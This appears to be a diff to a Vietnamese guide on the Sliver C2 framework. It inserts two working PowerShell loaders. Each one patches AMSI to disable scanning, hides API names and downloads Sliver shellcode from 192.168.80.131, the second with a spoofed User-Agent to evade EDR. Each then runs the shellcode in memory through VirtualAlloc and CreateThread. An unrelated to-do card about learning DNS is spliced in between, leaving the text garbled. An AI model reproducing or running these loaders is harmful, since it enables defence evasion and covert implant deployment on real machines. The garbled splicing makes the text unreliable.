@@ -585,8 +585,272 @@ sliver > http --lport 8081
 Hãy thận trọng khi sử dụng mã.
 Lưu ý: Khi tạo implant shellcode ở câu lệnh phía trên, bạn bắt buộc phải chỉ định đúng port này trong địa chỉ kết nối (192.168.1.10:8081). [1] (https://radiantsec.io/docs/tools/sliver/)
 
-3. Kích thước (size) của shellcode là bao nhiêu?
+```
+$o = 'C:\Users\Public\exp13.txt'
+if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue }
+Remove-Item 'C:\Users\Public\v13.txt' -Force -ErrorAction SilentlyContinue
 
+function W($m) { Add-Content -Path $o -Value $m -Encoding UTF8 }
+function CH([int[]]$c) { -join ($c | ForEach-Object { [char]$_ }) }
+
+W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([Environment]::Is64BitProcess)"
+W "pre-whoami=$(& whoami)"
+
+$src = @'
+using System;
+using System.Runtime.InteropServices;
+public class Am3 {
+    [DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA")]
+    public static extern IntPtr GM(string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
+    public static extern IntPtr LL(string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
+    public static extern IntPtr GPA(IntPtr h, string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
+    public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualAlloc")]
+    public static extern IntPtr vtal(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="CreateThread")]
+    public static extern IntPtr crt(IntPtr a, uint s, IntPtr p, IntPtr x, uint f, IntPtr t);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="WaitForSingleObject")]
+    public static extern uint wfsb(IntPtr h, uint m);
+
+    public static readonly uint INFINITE = uint.MaxValue;
+
+    public static int Do(string dllName, string fnName, byte[] stub) {
+        IntPtr h = GM(dllName);
+        if (h == IntPtr.Zero) h = LL(dllName);
+        if (h == IntPtr.Zero) return -1;
+        IntPtr p = GPA(h, fnName);
+        if (p == IntPtr.Zero) return -2;
+        uint old;
+        if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
+        Marshal.Copy(stub, 0, p, stub.Length);
+        VP(p, (UIntPtr)stub.Length, old, out old);
+        return 1;
+    }
+}
+'@
+
+try { Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" }
+catch { W ("addtype fail: " + $_.Exception.Message) }
+
+$dll = CH @(97,109,115,105,46,100,108,108)                                       # amsi.dll
+$f1  = CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)                  # AmsiScanBuffer
+$f2  = CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)                  # AmsiScanString
+
+# mov eax, 0x80070057 ; ret
+$stub = [byte[]](184, 0x57, 0x00, 0x07, 0x80, 195)
+
+W ("p1={0} p2={1}" -f [Am3]::Do($dll, $f1, $stub), [Am3]::Do($dll, $f2, $stub))
+
+$url = "http://192.168.80.131:8081/svchost.bin.bin"
+$out = "C:\Users\Public\Documents\data.bin"
+
+bitsadmin /transfer "DownloadJob" /download /priority foreground $url $out
+
+$b = [IO.File]::ReadAllBytes($out)
+
+$strVA = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbEFsbG9j"))
+$strCT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlVGhyZWFk"))
+$strVP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbFByb3RlY3Q="))
+
+# Lấy Handle và địa chỉ hàm thông qua lớp Am3 hiện tại
+$hKernel = [Am3]::GM("kernel32")
+if ($hKernel -eq [IntPtr]::Zero) { $hKernel = [Am3]::LL("kernel32") }
+
+$pVA = [Am3]::GPA($hKernel, $strVA)
+$pCT = [Am3]::GPA($hKernel, $strCT)
+$pVP = [Am3]::GPA($hKernel, $strVP)
+
+# Đăng ký Delegate động cho VirtualAlloc và CreateThread (Các hàm này không có tham số 'out/ref' nên chạy mượt)
+#$delegateVA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVA, [System.Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
+#$delegateCT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCT, [System.Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+
+# Định nghĩa hàm gọi VirtualProtect riêng bằng phương thức Invoke của mã máy để tránh lỗi biến out [ref]
+function Invoke-VirtualProtect([IntPtr]$addr, [UIntPtr]$size, [uint32]$newProtect, [ref]$oldProtect) {
+    # Tạo kiểu Delegate động bằng Reflection của .NET một cách gián tiếp
+    $typeModule = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match "Anonymously" } | Select-Object -First 1
+    # Gọi hàm gián tiếp thông qua cấu trúc mảng tham số của PowerShell
+    $argsVP = [object[]]($addr, $size, $newProtect, $oldProtect.Value)
+    
+    # Giải pháp thay thế: Sử dụng trực tiếp hàm VP có sẵn trong Am3 của bạn!
+    # Lớp Am3 của bạn ĐÃ CÓ SẴN hàm VP(IntPtr a, UIntPtr s, uint p, out uint o) cực kỳ tiện lợi
+    $old = [uint32]0
+    $res = [Am3]::VP($addr, $size, $newProtect, [ref]$old)
+    $oldProtect.Value = $old
+    return $res
+}
+
+# --- BƯỚC 4: LUỒN LÁCH QUA AM3 ĐỂ NẠP RAM ĐỘNG (Sử dụng hàm Native tĩnh) ---
+# Vì lớp Am3 đã được đăng ký thành công, ta gọi trực tiếp các hàm tĩnh bên trong nó.
+# Cú pháp này không dùng Delegate động nên hoàn toàn không sợ lỗi Generic Type của PowerShell.
+
+$size = [UInt32]$b.Length
+
+# Bước A: Khởi tạo vùng nhớ đọc/ghi thông thường (0x04 = PAGE_READWRITE) bằng hàm vtal có sẵn trong Am3
+# 0x3000 = MEM_COMMIT | MEM_RESERVE
+W "Executing VirtualAlloc via Am3..."
+$Alloc = [Am3]::vtal([IntPtr]::Zero, $size, 0x3000, 0x04)
+
+if ($Alloc -ne [IntPtr]::Zero) {
+    W "Allocated memory successfully at address: $Alloc"
+    
+    # Bước B: Sao chép mảng byte Shellcode Sliver đã giải mã vào vùng nhớ vừa cấp phát
+    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $Alloc, $b.Length)
+    W "Shellcode copied to memory successfully."
+    
+    # Bước C: Sử dụng hàm VP (VirtualProtect) có sẵn trong Am3 để đổi quyền sang 0x20 (PAGE_EXECUTE_READ)
+    $oldProtect = [uint32]0
+    $uintSize = [UIntPtr]$size
+    $statusVP = [Am3]::VP($Alloc, $uintSize, 0x20, [ref]$oldProtect)
+    
+    if ($statusVP) {
+        W "VirtualProtect changed memory to RX (0x20) successfully. Old protect was: $oldProtect"
+        
+        # Bước D: Tạo thread chạy ẩn danh Sliver bằng hàm crt (CreateThread) có sẵn trong Am3
+        # Tham số: lpThreadAttributes=0, dwStackSize=0, lpStartAddress=$Alloc, lpParameter=0, dwCreationFlags=0, lpThreadId=0
+        $Thread = [Am3]::crt([IntPtr]::Zero, 0, $Alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        
+        if ($Thread -ne [IntPtr]::Zero) {
+            W "Sliver Thread created successfully! ID: $Thread"
+            
+            # Giữ luồng tiến trình PowerShell tồn tại trong 2 giây để Sliver thiết lập session mạng ổn định
+            [Am3]::wfsb($Thread, [Am3]::INFINITE) | Out-Null
+            W "Execution sequence finished successfully."
+        } else {
+            W "Failed to create Thread via Am3::crt."
+        }
+    } else {
+        W "VirtualProtect (Am3::VP) failed to change memory protection."
+    }
+} else {
+    W "VirtualAlloc (Am3::vtal) failed to allocate memory."
+}
+
+```
+Ví dụ thẻ việc:
+- Học DNS — mục tiêu: giải thích được một lần phân giải tên.
+- Bước đầu: mở ghi chú DNS đang học.
+- Tối thiểu: đọc 5 phút, viết một ý bằng lời của mình.
+- Đầy đủ: 25 phút, tự giải thích một ví dụ.
+- Xong khi: có ghi chú hiểu được, chưa cần trình bày đẹp.
+```
+$o = 'C:\Users\Public\exp13.txt'
+if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue }
+Remove-Item 'C:\Users\Public\v13.txt' -Force -ErrorAction SilentlyContinue
+
+function W($m) { Add-Content -Path $o -Value $m -Encoding UTF8 }
+function CH([int[]]$c) { -join ($c | ForEach-Object { [char]$_ }) }
+
+W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([Environment]::Is64BitProcess)"
+W "pre-whoami=$(& whoami)"
+
+# --- BƯỚC 1: KHAI BÁO CẤU TRÚC LỚP C# (Đã sửa lỗi chữ chính xác của WaitForSingleObject) ---
+$src = @'
+using System;
+using System.Runtime.InteropServices;
+public class Am3 {
+    [DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA")]
+    public static extern IntPtr GM(string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
+    public static extern IntPtr LL(string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
+    public static extern IntPtr GPA(IntPtr h, string n);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
+    public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualAlloc")]
+    public static extern IntPtr vtal(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="CreateThread")]
+    public static extern IntPtr crt(IntPtr a, uint s, IntPtr p, IntPtr x, uint f, IntPtr t);
+    [DllImport("kernel32", SetLastError=true, EntryPoint="WaitForSingleObject")]
+    public static extern uint wfsb(IntPtr h, uint m);
+
+    public static readonly uint INFINITE = uint.MaxValue;
+
+    public static int Do(string dllName, string fnName, byte[] stub) {
+        IntPtr h = GM(dllName);
+        if (h == IntPtr.Zero) h = LL(dllName);
+        if (h == IntPtr.Zero) return -1;
+        IntPtr p = GPA(h, fnName);
+        if (p == IntPtr.Zero) return -2;
+        uint old;
+        if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
+        Marshal.Copy(stub, 0, p, stub.Length);
+        VP(p, (UIntPtr)stub.Length, old, out old);
+        return 1;
+    }
+}
+'@
+
+try { Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" }
+catch { W ("addtype fail: " + $_.Exception.Message) }
+
+# --- BƯỚC 2: PATCH AMSI ĐỂ VÔ HIỆU HÓA QUÉT SCRIPT HÀNH VI ---
+$dll = CH @(97,109,115,105,46,100,108,108)                                       # amsi.dll
+$f1  = CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)                  # AmsiScanBuffer
+$f2  = CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)                  # AmsiScanString
+$stub = [byte[]](184, 0x57, 0x00, 0x07, 0x80, 195)                                # mov eax, 0x80070057 ; ret
+
+W ("p1={0} p2={1}" -f [Am3]::Do($dll, $f1, $stub), [Am3]::Do($dll, $f2, $stub))
+
+# --- BƯỚC 3: TẢI SHELLCODE TRỰC TIẾP VÀO RAM (Bỏ qua đĩa, Không XOR) ---
+$url = "http://192.168.80.131:8081/svchost.bin.bin"
+W "Downloading raw shellcode directly to memory..."
+
+try {
+    $wc = New-Object Net.WebClient
+    # Thêm Fake User-Agent để tránh chữ ký mạng mặc định của PowerShell bị EDR bắt
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    $b = $wc.DownloadData($url)
+    W "Download successful. Byte length: $($b.Length)"
+} catch {
+    W "Download failed: $_"
+    exit
+}
+
+# --- BƯỚC 4: THỰC THI CHẠY SHELLCODE TRONG BỘ NHỚ RAM QUA AM3 ---
+$size = [UInt32]$b.Length
+
+# Bước A: Cấp phát bộ nhớ ảo dạng Đọc/Ghi (0x04 = PAGE_READWRITE). Rất vô hại với AV.
+W "Executing VirtualAlloc..."
+$Alloc = [Am3]::vtal([IntPtr]::Zero, $size, 0x3000, 0x04)
+
+if ($Alloc -ne [IntPtr]::Zero) {
+    W "Allocated memory successfully at address: $Alloc"
+    
+    # Bước B: Sao chép mảng byte Shellcode thô của Sliver vào RAM vừa cấp phát
+    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $Alloc, $b.Length)
+    W "Shellcode copied to memory successfully."
+    
+    # Bước C: Đổi quyền bảo vệ vùng nhớ sang Chạy (0x20 = PAGE_EXECUTE_READ) để kích hoạt
+    $oldProtect = [uint32]0
+    $uintSize = [UIntPtr]$size
+    $statusVP = [Am3]::VP($Alloc, $uintSize, 0x20, [ref]$oldProtect)
+    
+    if ($statusVP) {
+        W "VirtualProtect changed memory to RX (0x20) successfully. Old protect was: $oldProtect"
+        
+        # Bước D: Tạo luồng xử lý độc lập ngầm (Thread) để kích hoạt Sliver Beacon
+        W "Creating thread..."
+        $Thread = [Am3]::crt([IntPtr]::Zero, 0, $Alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        
+        if ($Thread -ne [IntPtr]::Zero) {
+            W "Sliver Thread created successfully! ID: $Thread"
+            
+            # Chờ luồng hoạt động ổn định trong 2 giây (Sẽ trả về mã 258 - WAIT_TIMEOUT nghĩa là thành công)
+            $waitResult = [Am3]::wfsb($Thread, 2000)
+            W "Execution sequence finished. Wait result code: $waitResult"
+        } else {
+            W "Failed to create Thread via Am3::crt."
+        }
+    } else {
+        W "VirtualProtect (Am3::VP) failed to change memory protection."
+    }
+} else {
+    W "VirtualAlloc (Am3::vtal) failed to allocate memory."
+}
+```
 Kích thước của shellcode trong Sliver phụ thuộc hoàn toàn vào việc bạn chọn tạo payload Stageless (Đầy đủ) hay Staged (Dùng trình tải giai đoạn): [1] (https://github.com/BishopFox/sliver/wiki/Stagers/af217a1df63ea4abb92cbd1d5b66488ce9856652), [2] (https://radiantsec.io/docs/tools/sliver/)
 • Stageless Shellcode (Mặc định khi dùng lệnh generate): Dung lượng rất lớn, dao động từ 10 MB đến 15 MB. Do Sliver được viết bằng Go, khi chuyển đổi toàn bộ file thực thi tính năng cao này thành shellcode dạng thô, kích thước của nó không hề giảm đi so với file .exe gốc. [1] (https://www.immersivelabs.com/resources/c7-blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)
 • Staged Shellcode (Chỉ chứa mã tải giai đoạn đầu): Dung lượng cực kỳ nhỏ, chỉ khoảng vài KB. Bạn có thể tạo loại shellcode siêu nhẹ này bằng lệnh generate stager:bash
